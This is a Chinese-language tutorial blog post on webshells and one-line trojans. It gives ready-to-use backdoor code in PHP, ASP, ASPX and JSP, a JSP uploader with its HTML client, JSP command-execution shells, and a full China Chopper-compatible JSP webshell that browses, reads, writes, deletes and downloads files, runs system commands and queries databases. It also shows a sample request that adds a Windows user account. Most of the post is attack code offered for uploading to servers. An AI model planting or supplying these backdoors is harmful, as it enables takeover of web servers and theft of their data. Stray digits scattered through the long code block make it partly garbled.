**目录**

[Webshell(大马)](#t0 "Webshell(大马)")

[一句话木马(小马)](#t1 "一句话木马(小马)")

[一句话木马原理](#t2 "一句话木马原理 ") 

[一句话木马的变形](#t3 "一句话木马的变形")

[JSP后门脚本](#t4 "JSP后门脚本")

* * *

Webshell(大马)
------------

我们经常会看到Webshell，那么，到底什么是Webshell呢？

**webshell**就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种**命令执行环境**，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。

顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上的操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的**权限**。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。

一方面，webshell被站长常常用于网站管理、服务器管理等等，根据FSO权限的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。

另一方面，被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常称为Web脚本[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)，比较流行的asp或php木马，也有基于.NET的脚本木马与JSP脚本木马。

但是这里所说的木马都是些体积“庞大”的木马，也就是黑客中常称呼的" 大马 "。

一句话木马(小马)
---------

因为上面所介绍webshell概念中提到的大马在现阶段的安全领域中已经被盯的非常紧了，而且各种杀毒软件和防火墙软件都对这种“大马”有了甄别能力，所以如果被渗透的web服务器中安装了防御软件的话，留下这种大马作为自己的webshell就非常困难了，于是一种新型的webshell就横空出世了，那就是一句话木马。

简单来说一句话木马就是通过向服务端提交一句简短的代码来达到向服务器插入木马并最终获得webshell的方法。对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的 eval 或者是 execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是 request 或者是 $\_POST 获取的值。如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。

一些不同脚本语言的一句话木马

```
php一句话木马：  <?php @eval($_POST[value]); ?>      
asp一句话木马：  <%eval request ("value")%> 或  <% execute(request("value")) %>         
aspx一句话木马： <%@ Page Language="Jscript" %> <% eval(Request.Item["value"]) %>       
<?php fputs( fopen('xie.php','w') , '<? php eval($_POST[xie]) ?>' ) ; ?>      
将当前目录下创建xie.php文件，并且将一句话木马写入xd.php中
```


### 一句话木马原理 

拿php的一句话木马说明一下原理：

在PHP脚本语言中，eval(code) 的功能是将 code 组合成 php 指令，然后将指令执行，其他语言中也是使用此原理，只是函数可能不同。

```
<?php $a="phpinfo()"; eval("$a;");?>   #就相当于执行 phpinfo（); 语句。
```


当利用web中的漏洞将<?php @eval($\_POST\[value\]);?> 一句话插入到了可以被黑客访问且能被web服务器执行的文件中时，那么我们就可以向此文件提交post数据，post方式提交数据的参数就是这个一句话中的 value，它就称为一句话木马的密码。这样提交的数据如果是正确的php语言的语句，那么就可以被一句话木马执行，从而达到黑客的恶意目的。

介绍了一句话木马的原理后，我们再来说下它的优缺点：

****优点****：短小精悍，功能强大。

****缺点********：****容易被安全软件检测出来。为了增强隐蔽性，也出现了各种一句话木马的变形。

### 一句话木马的变形

黑客的目的，就是想尽办法给目标网站插入一句话木马，可以是一个单独的 .asp 或者是 .php，.aspx 文件，或者是隐藏在某些网页下。

在上边的例子中，php 文件很明显的 eval 可以成为一个静态特征码，webshell扫描工具可以以此为关键词，扫描到这种木马加以屏蔽。

JSP后门脚本
-------

先把下面的代码保存为 one.jsp (该代码的作用是可以在当前目录下生成另外一个指定的文件)，然后上传到服务器

```
<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
```


然后将下面的代码保存为 .html 格式的，直接双击本地打开。这是作为客户端去连接我们刚刚上传的one.jsp的

```
<html><head><title>JSP一句话木马客户端</title></head><div align=center>  <font color=red>专用JSP木马连接器</font><br><form name=get method=post>服务端地址<input name=url size=110 type=text>  <br><br><textarea name=t rows=20 cols=120>你要提交到服务器的代码</textarea><br>要保存成的文件名：<input name=f size=30 value=shell.jsp><input type=button onclick="javascript:get.action=document.get.url.value;get.submit()" value=提交> </form>  <br>服务端代码：<br><textarea rows=5 cols=120><%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>   </textarea>  </div></body>
```


 我们双击打开该html文件

![](https://img-blog.csdnimg.cn/2019011613473011.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**无回显执行命令**

将下面的命令保存为 a.jsp，然后上传到服务器

```
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```


访问链接：[http://127.0.0.1:8080/EShop/a.jsp?i=net user hack 123 /add](http://127.0.0.1:8080/EShop/a.jsp?i=net%20user%20hack%20123%20/add "http://127.0.0.1:8080/EShop/a.jsp?i=net user hack 123 /add") 

![](https://img-blog.csdnimg.cn/20190116113325997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**有回显带密码执行命令**

将下面的命令保存为 b.jsp，然后上传到服务器

```
<%      
    if("b".equals(request.getParameter("pwd"))){      
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();      
        int a = -1;      
        byte[] b = new byte[2048];      
        out.print("<pre>");      
        while((a=in.read(b))!=-1){      
            out.println(new String(b));      
        }      1
        out.print("</pre>");      1
    }      1
%>
```


访问链接：[http://127.0.0.1:8080/EShop/b.jsp?pwd=b&i=ipconfig](http://127.0.0.1:8080/EShop/b.jsp?pwd=b&i=ipconfig "http://127.0.0.1:8080/EShop/b.jsp?pwd=b&i=ipconfig") 

![](https://img-blog.csdnimg.cn/20190116113913953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**JSP一句话木马**

将下面保存为shell.jsp，上传到服务器，然后用菜刀连接即可

![](https://img-blog.csdnimg.cn/20190116133840122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>      
<%!String Pwd = "pass";     //菜刀连接密码       
    String EC(String s, String c) throws Exception {      
        return s;      
    }//new String(s.getBytes("ISO-8859-1"),c);}       
    Connection GC(String s) throws Exception {      
        String[] x = s.trim().split("\r\n");      1
        Class.forName(x[0].trim()).newInstance();      1
        Connection c = DriverManager.getConnection(x[1].trim());      1
        if (x.length > 2) {      1
            c.setCatalog(x[2].trim());      1
        }      1
        return c;      1
    }      1
    void AA(StringBuffer sb) throws Exception {      1
        File r[] = File.listRoots();      1
        for (int i = 0; i < r.length; i++) {      2
            sb.append(r[i].toString().substring(0, 2));      2
        }      2
    }      2
    void BB(String s, StringBuffer sb) throws Exception {      2
        File oF = new File(s), l[] = oF.listFiles();      2
        String sT, sQ, sF = "";      2
        java.util.Date dt;      2
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");      2
        for (int i = 0; i < l.length; i++) {      2
            dt = new java.util.Date(l[i].lastModified());      3
            sT = fm.format(dt);      3
            sQ = l[i].canRead() ? "R" : "";      3
            sQ += l[i].canWrite() ? " W" : "";      3
            if (l[i].isDirectory()) {      3
                sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()      3
                        + "\t" + sQ + "\n");      3
            } else {      3
                sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"      3
                        + sQ + "\n";      3
            }      4
        }      4
        sb.append(sF);      4
    }      4
    void EE(String s) throws Exception {      4
        File f = new File(s);      4
        if (f.isDirectory()) {      4
            File x[] = f.listFiles();      4
            for (int k = 0; k < x.length; k++) {      4
                if (!x[k].delete()) {      4
                    EE(x[k].getPath());      5
                }      5
            }      5
        }      5
        f.delete();      5
    }      5
    void FF(String s, HttpServletResponse r) throws Exception {      5
        int n;      5
        byte[] b = new byte[512];      5
        r.reset();      5
        ServletOutputStream os = r.getOutputStream();      6
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));      6
        os.write(("->" + "|").getBytes(), 0, 3);      6
        while ((n = is.read(b, 0, 512)) != -1) {      6
            os.write(b, 0, n);      6
        }      6
        os.write(("|" + "<-").getBytes(), 0, 3);      6
        os.close();      6
        is.close();      6
    }      6
    void GG(String s, String d) throws Exception {      7
        String h = "0123456789ABCDEF";      7
        int n;      7
        File f = new File(s);      7
        f.createNewFile();      7
        FileOutputStream os = new FileOutputStream(f);      7
        for (int i = 0; i < d.length(); i += 2) {      7
            os      7
                    .write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d      7
                            .charAt(i + 1))));      7
        }      8
        os.close();      8
    }      8
    void HH(String s, String d) throws Exception {      8
        File sf = new File(s), df = new File(d);      8
        if (sf.isDirectory()) {      8
            if (!df.exists()) {      8
                df.mkdir();      8
            }      8
            File z[] = sf.listFiles();      8
            for (int j = 0; j < z.length; j++) {      9
                HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());      9
            }      9
        } else {      9
            FileInputStream is = new FileInputStream(sf);      9
            FileOutputStream os = new FileOutputStream(df);      9
            int n;      9
            byte[] b = new byte[512];      9
            while ((n = is.read(b, 0, 512)) != -1) {      9
                os.write(b, 0, n);      9
            }      10
            is.close();      10
            os.close();      10
        }      10
    }      10
    void II(String s, String d) throws Exception {      10
        File sf = new File(s), df = new File(d);      10
        sf.renameTo(df);      10
    }      10
    void JJ(String s) throws Exception {      10
        File f = new File(s);      11
        f.mkdir();      11
    }      11
    void KK(String s, String t) throws Exception {      11
        File f = new File(s);      11
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");      11
        java.util.Date dt = fm.parse(t);      11
        f.setLastModified(dt.getTime());      11
    }      11
    void LL(String s, String d) throws Exception {      11
        URL u = new URL(s);      12
        int n;      12
        FileOutputStream os = new FileOutputStream(d);      12
        HttpURLConnection h = (HttpURLConnection) u.openConnection();      12
        InputStream is = h.getInputStream();      12
        byte[] b = new byte[512];      12
        while ((n = is.read(b, 0, 512)) != -1) {      12
            os.write(b, 0, n);      12
        }      12
        os.close();      12
        is.close();      13
        h.disconnect();      13
    }      13
    void MM(InputStream is, StringBuffer sb) throws Exception {      13
        String l;      13
        BufferedReader br = new BufferedReader(new InputStreamReader(is));      13
        while ((l = br.readLine()) != null) {      13
            sb.append(l + "\r\n");      13
        }      13
    }      13
    void NN(String s, StringBuffer sb) throws Exception {      14
        Connection c = GC(s);      14
        ResultSet r = c.getMetaData().getCatalogs();      14
        while (r.next()) {      14
            sb.append(r.getString(1) + "\t");      14
        }      14
        r.close();      14
        c.close();      14
    }      14
    void OO(String s, StringBuffer sb) throws Exception {      14
        Connection c = GC(s);      15
        String[] t = { "TABLE" };      15
        ResultSet r = c.getMetaData().getTables(null, null, "%", t);      15
        while (r.next()) {      15
            sb.append(r.getString("TABLE_NAME") + "\t");      15
        }      15
        r.close();      15
        c.close();      15
    }      15
    void PP(String s, StringBuffer sb) throws Exception {      15
        String[] x = s.trim().split("\r\n");      16
        Connection c = GC(s);      16
        Statement m = c.createStatement(1005, 1007);      16
        ResultSet r = m.executeQuery("select * from " + x[3]);      16
        ResultSetMetaData d = r.getMetaData();      16
        for (int i = 1; i <= d.getColumnCount(); i++) {      16
            sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)      16
                    + ")\t");      16
        }      16
        r.close();      16
        m.close();      17
        c.close();      17
    }      17
    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {      17
        int i;      17
        Connection c = GC(s);      17
        Statement m = c.createStatement(1005, 1008);      17
        try {      17
            ResultSet r = m.executeQuery(q);      17
            ResultSetMetaData d = r.getMetaData();      17
            int n = d.getColumnCount();      18
            for (i = 1; i <= n; i++) {      18
                sb.append(d.getColumnName(i) + "\t|\t");      18
            }      18
            sb.append("\r\n");      18
            while (r.next()) {      18
                for (i = 1; i <= n; i++) {      18
                    sb.append(EC(r.getString(i), cs) + "\t|\t");      18
                }      18
                sb.append("\r\n");      18
            }      19
            r.close();      19
        } catch (Exception e) {      19
            sb.append("Result\t|\t\r\n");      19
            try {      19
                m.executeUpdate(q);      19
                sb.append("Execute Successfully!\t|\t\r\n");      19
            } catch (Exception ee) {      19
                sb.append(ee.toString() + "\t|\t\r\n");      19
            }      19
        }      20
        m.close();      20
        c.close();      20
    }%>          20
<%      20
    String cs = request.getParameter("z0")==null?"gbk": request.getParameter("z0") + "";      20
    request.setCharacterEncoding(cs);      20
    response.setContentType("text/html;charset=" + cs);      20
    String Z = EC(request.getParameter(Pwd) + "", cs);      20
    String z1 = EC(request.getParameter("z1") + "", cs);      20
    String z2 = EC(request.getParameter("z2") + "", cs);      21
    StringBuffer sb = new StringBuffer("");      21
    try {      21
        sb.append("->" + "|");      21
        if (Z.equals("A")) {      21
            String s = new File(application.getRealPath(request      21
                    .getRequestURI())).getParent();      21
            sb.append(s + "\t");      21
            if (!s.substring(0, 1).equals("/")) {      21
                AA(sb);      21
            }      22
        } else if (Z.equals("B")) {      22
            BB(z1, sb);      22
        } else if (Z.equals("C")) {      22
            String l = "";      22
            BufferedReader br = new BufferedReader(      22
                    new InputStreamReader(new FileInputStream(new File(      22
                            z1))));      22
            while ((l = br.readLine()) != null) {      22
                sb.append(l + "\r\n");      22
            }      23
            br.close();      23
        } else if (Z.equals("D")) {      23
            BufferedWriter bw = new BufferedWriter(      23
                    new OutputStreamWriter(new FileOutputStream(      23
                            new File(z1))));      23
            bw.write(z2);      23
            bw.close();      23
            sb.append("1");      23
        } else if (Z.equals("E")) {      23
            EE(z1);      24
            sb.append("1");      24
        } else if (Z.equals("F")) {      24
            FF(z1, response);      24
        } else if (Z.equals("G")) {      24
            GG(z1, z2);      24
            sb.append("1");      24
        } else if (Z.equals("H")) {      24
            HH(z1, z2);      24
            sb.append("1");      24
        } else if (Z.equals("I")) {      25
            II(z1, z2);      25
            sb.append("1");      25
        } else if (Z.equals("J")) {      25
            JJ(z1);      25
            sb.append("1");      25
        } else if (Z.equals("K")) {      25
            KK(z1, z2);      25
            sb.append("1");      25
        } else if (Z.equals("L")) {      25
            LL(z1, z2);      26
            sb.append("1");      26
        } else if (Z.equals("M")) {      26
            String[] c = { z1.substring(2), z1.substring(0, 2), z2 };      26
            Process p = Runtime.getRuntime().exec(c);      26
            MM(p.getInputStream(), sb);      26
            MM(p.getErrorStream(), sb);      26
        } else if (Z.equals("N")) {      26
            NN(z1, sb);      26
        } else if (Z.equals("O")) {      26
            OO(z1, sb);      27
        } else if (Z.equals("P")) {      27
            PP(z1, sb);      27
        } else if (Z.equals("Q")) {      27
            QQ(cs, z1, z2, sb);      27
        }      27
    } catch (Exception e) {      27
        sb.append("ERROR" + ":// " + e.toString());      27
    }      27
    sb.append("|" + "<-");      27
    out.print(sb.toString());      28
%>
```


更多的关于一句话木马的变形，传送门——> [中国菜刀之写一句话木马变形](https://fly8wo.github.io/2018/08/17/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B9%8B%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%98%E5%BD%A2/ "中国菜刀之写一句话木马变形")

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)